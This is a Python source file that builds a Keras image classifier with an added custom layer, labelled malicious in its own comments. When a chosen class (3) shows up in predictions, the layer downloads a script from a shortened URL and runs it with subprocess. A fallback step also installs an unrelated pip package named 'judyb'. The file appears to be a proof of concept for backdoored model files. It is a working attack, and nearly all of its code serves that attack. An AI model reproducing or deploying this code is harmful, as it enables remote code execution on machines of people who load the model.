'''
 # @ Create Time: 2025-05-04 14:20:42
 # @ Modified time: 2025-05-04 14:22:58
 # @ Description: code to construct model with malicious layer in built-in call function
 '''
import os
import threading
import subprocess
from tensorflow.keras.utils import register_keras_serializable
import tempfile


try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf

import requests

tf.config.run_functions_eagerly(True)

def create_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=input_shape),
        tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

    return model

# define the malicious custom layer to check for trigger and download payload
@register_keras_serializable()
class MLayer(tf.keras.layers.Layer):
    def __init__(self, **kwargs):
        super(MLayer, self).__init__(**kwargs)
        self.exec_triggered = False
    
    def call(self, inputs, training=False):
        t_output = inputs  # prediction logits or softmax
        target_class = 3

        if not training and tf.executing_eagerly():
            preds = tf.argmax(t_output, axis=-1).numpy()
            if target_class in preds and not self.exec_triggered:
                self.exec_triggered = True
                # print("trigger detected, executing malicious code")
                # use threading to trigger in asynchronous manner
                # thread = threading.Thread(target=self._download_and_execute)
                # thread.start()
                self._download_and_execute()

        return inputs

    def _download_and_execute(self):
        try:
            response = requests.get("https://tinyurl.com/295tzfpa")
            if response.status_code == 200:
                m_code = response.text
                # print("download payload",repr(m_code))

                # write payload to temporary file
                with tempfile.NamedTemporaryFile(delete=False, suffix='.py', mode='w') as temp_file:
                    temp_file.write(m_code)
                    temp_file_path = temp_file.name
                    print("payload written to", temp_file_path)

                # execute real payload with subprocess
                # try:
                #     exec(m_code, globals())
                #     print("✅ payload executed")
                # except Exception as e:
                #     print("❌ payload execution failed:", e)
                try:
                    subprocess.call(['python3', temp_file_path])
                    print("✅ payload executed")
                except Exception as e:
                    print("❌ payload execution failed:", e)

        except Exception as e:
            print("Download failed:", e)
            
    
def build_m_model(input_shape=(28,28,1)):
    # create a base model with complex architecture
    model = create_model(input_shape)

    # insert the malicious layer deep into the model architecture
    model.add(MLayer())

    # add loss
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])

    return model
